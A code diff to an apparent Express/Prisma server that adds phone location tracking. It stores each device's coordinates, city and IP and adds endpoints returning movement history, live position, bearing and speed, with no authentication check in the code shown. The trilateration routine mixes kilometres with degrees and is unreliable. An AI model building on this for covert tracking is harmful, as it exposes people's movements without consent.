@@ -27,6 +27,57 @@ function sanitize(obj) {
   return obj;
 }
 
+// ============= TRACKING MATH =============
+function haversineDistance(lat1, lng1, lat2, lng2) {
+  const R = 6371;
+  const dLat = (lat2 - lat1) * Math.PI / 180;
+  const dLng = (lng2 - lng1) * Math.PI / 180;
+  const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+    Math.sin(dLng/2) * Math.sin(dLng/2);
+  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+  return R * c;
+}
+
+function calculateBearing(lat1, lng1, lat2, lng2) {
+  const dLng = (lng2 - lng1) * Math.PI / 180;
+  const y = Math.sin(dLng) * Math.cos(lat2 * Math.PI / 180);
+  const x = Math.cos(lat1 * Math.PI / 180) * Math.sin(lat2 * Math.PI / 180) -
+    Math.sin(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.cos(dLng);
+  return (Math.atan2(y, x) * 180 / Math.PI + 360) % 360;
+}
+
+function trilaterate(points) {
+  if (points.length < 3) return points[0] || null;
+  const p1 = points[0], p2 = points[1], p3 = points[2];
+  const R = 6371;
+  const d1 = p1.accuracy ? p1.accuracy / 1000 : 1;
+  const d2 = p2.accuracy ? p2.accuracy / 1000 : 1;
+  const d3 = p3.accuracy ? p3.accuracy / 1000 : 1;
+  const x1 = p1.lat, y1 = p1.lng;
+  const x2 = p2.lat, y2 = p2.lng;
+  const x3 = p3.lat, y3 = p3.lng;
+  const A = 2 * (x2 - x1);
+  const B = 2 * (y2 - y1);
+  const C = d1*d1 - d2*d2 + x2*x2 - x1*x1 + y2*y2 - y1*y1;
+  const D = 2 * (x3 - x1);
+  const E = 2 * (y3 - y1);
+  const F = d1*d1 - d3*d3 + x3*x3 - x1*x1 + y3*y3 - y1*y1;
+  const det = A*E - B*D;
+  if (Math.abs(det) < 1e-10) return points[0];
+  const lat = (C*E - B*F) / det;
+  const lng = (A*F - C*D) / det;
+  return { lat, lng, source: 'trilateration' };
+}
+
+function pathLossDistance(signalStrength, frequency, txPower) {
+  const n = 2.8;
+  const refPower = txPower || -50;
+  if (!signalStrength || signalStrength === 0) return null;
+  const ratio = (refPower - signalStrength) / (10 * n);
+  return Math.pow(10, ratio);
+}
+
 // ============= DATABASE =============
 const prisma = new PrismaClient({
   datasources: {
@@ -417,6 +468,10 @@ app.post('/api/location/phone', async (req, res) => {
         lng: location.lng,
         intLat: location.intLat || Math.round(location.lat * 1000000),
         intLng: location.intLng || Math.round(location.lng * 1000000),
+        city: location.city || '',
+        region: location.region || '',
+        country: location.country || '',
+        ip: location.ip || '',
         updatedAt: Date.now(),
       },
       update: {
@@ -424,10 +479,134 @@ app.post('/api/location/phone', async (req, res) => {
         lng: location.lng,
         intLat: location.intLat || Math.round(location.lat * 1000000),
         intLng: location.intLng || Math.round(location.lng * 1000000),
+        city: location.city || '',
+        region: location.region || '',
+        country: location.country || '',
+        ip: location.ip || '',
         updatedAt: Date.now(),
       },
     });
+
+    if (location.tracking) {
+      await prisma.command.create({
+        data: {
+          commandId: 'track_' + crypto.randomBytes(8).toString('hex'),
+          deviceId,
+          commandType: 'trackpoint',
+          params: JSON.stringify(location.tracking),
+          status: 'completed',
+          createdAt: Date.now(),
+          completedAt: Date.now(),
+        },
+      });
+    }
+
     res.json({ success: true });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ success: false, error: e.message });
+  }
+});
+
+// ============= TRACKING: Get Path History =============
+app.get('/api/tracking/path/:deviceId', async (req, res) => {
+  try {
+    const points = await prisma.command.findMany({
+      where: {
+        deviceId: req.params.deviceId,
+        commandType: 'trackpoint',
+      },
+      orderBy: { createdAt: 'asc' },
+      take: 1000,
+    });
+
+    const path = points.map(p => {
+      const params = JSON.parse(p.params || '{}');
+      return {
+        lat: params.lat,
+        lng: params.lng,
+        accuracy: params.accuracy,
+        altitude: params.altitude,
+        speed: params.speed,
+        heading: params.heading,
+        source: params.source,
+        signalStrength: params.signalStrength,
+        timestamp: Number(p.createdAt),
+      };
+    }).filter(p => p.lat && p.lng);
+
+    let totalDistance = 0;
+    for (let i = 1; i < path.length; i++) {
+      totalDistance += haversineDistance(path[i-1].lat, path[i-1].lng, path[i].lat, path[i].lng);
+    }
+
+    res.json(sanitize({
+      success: true,
+      path,
+      totalPoints: path.length,
+      totalDistance: Math.round(totalDistance * 100) / 100,
+    }));
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ success: false, error: e.message });
+  }
+});
+
+// ============= TRACKING: Get Live Triangulation =============
+app.get('/api/tracking/live/:deviceId', async (req, res) => {
+  try {
+    const device = await prisma.device.findUnique({
+      where: { deviceId: req.params.deviceId },
+    });
+    if (!device) return res.json(sanitize({ success: true, tracking: null }));
+
+    const location = await prisma.location.findUnique({
+      where: { deviceId: req.params.deviceId },
+    });
+    if (!location) return res.json(sanitize({ success: true, tracking: null }));
+
+    const lastPoints = await prisma.command.findMany({
+      where: {
+        deviceId: req.params.deviceId,
+        commandType: 'trackpoint',
+      },
+      orderBy: { createdAt: 'desc' },
+      take: 10,
+    });
+
+    const recentPath = lastPoints.reverse().map(p => {
+      const params = JSON.parse(p.params || '{}');
+      return { lat: params.lat, lng: params.lng, timestamp: Number(p.createdAt), source: params.source };
+    }).filter(p => p.lat && p.lng);
+
+    let bearing = 0;
+    let speed = 0;
+    if (recentPath.length >= 2) {
+      const last = recentPath[recentPath.length - 1];
+      const prev = recentPath[recentPath.length - 2];
+      bearing = calculateBearing(prev.lat, prev.lng, last.lat, last.lng);
+      const dist = haversineDistance(prev.lat, prev.lng, last.lat, last.lng);
+      const timeDiff = (last.timestamp - prev.timestamp) / 1000;
+      if (timeDiff > 0) speed = dist / timeDiff;
+    }
+
+    res.json(sanitize({
+      success: true,
+      tracking: {
+        lat: location.lat,
+        lng: location.lng,
+        intLat: Number(location.intLat),
+        intLng: Number(location.intLng),
+        city: location.city,
+        region: location.region,
+        country: location.country,
+        ip: location.ip,
+        bearing,
+        speed,
+        lastSeen: Number(device.lastSeen),
+        recentPath,
+      },
+    }));
   } catch (e) {
     console.error(e);
     res.status(500).json({ success: false, error: e.message });
